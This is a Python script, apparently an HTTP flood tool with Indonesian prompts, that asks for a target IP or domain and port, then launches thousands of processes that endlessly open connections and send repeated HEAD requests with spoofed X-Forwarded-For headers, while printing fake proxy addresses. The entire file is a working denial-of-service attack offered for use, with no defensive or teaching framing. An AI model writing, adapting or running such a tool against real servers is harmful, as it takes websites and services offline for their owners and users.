import socket
import os
from time import sleep
import multiprocessing
import random
import platform

print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("Could not start the script")
else:
  print("Your system is not Linux, You may not be able to run this script in some systems")


def randomport():
  randport = ".".join(str(random.randint(0, 8080)) for _ in range(1))
  return randport
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: Keep-Alive\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
 
def attack2():
  connection = "Connection: Keep-Alive\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
os.system("clear")
print("""\u001b[35m
▒██   ██▒▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▒▒ █ █ ▒░▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
░░  █   ░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
 ░ █ █ ▒ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
▒██▒ ▒██▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
▒▒ ░ ░▓ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
░░   ░▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
 ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
 ░    ░               ░ ░      ░ ░      ░  ░      ░  
                                                     
              IP/DOMAIN TANPA HTTP/S""")
ip = input("   \u001b[35m[$] \u001b[37mIP/domain >>>  :\u001b[31m  ")
port = int(input("   \u001b[35m[$] \u001b[37mPort >>>  :\u001b[31m   "))
url = f"http://{str(ip)}"
os.system("clear")
print("""\u001b[37m  ██████ ▓█████  ███▄    █ ▓█████▄ 
▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ██▌
░ ▓██▄   ▒███   ▓██  ▀█ ██▒░██   █▌
  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▄   ▌
▒██████▒▒░▒████▒▒██░   ▓██░░▒████▓ 
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒▓  ▒ 
░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ▒  ▒ 
░  ░  ░     ░      ░   ░ ░  ░ ░  ░ 
      ░     ░  ░         ░    ░    
                            ░      """)
def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    mp = multiprocessing.Process(target=attack2)
    mp.setDaemon = False
    mp.start() #Magic Starts
    print(f"Proxy : {randomip()}:{randomport()} \u001b[36m Attacking On \u001b[31mIP {ip} PORT {port} \u001b[36m")
send2attack()
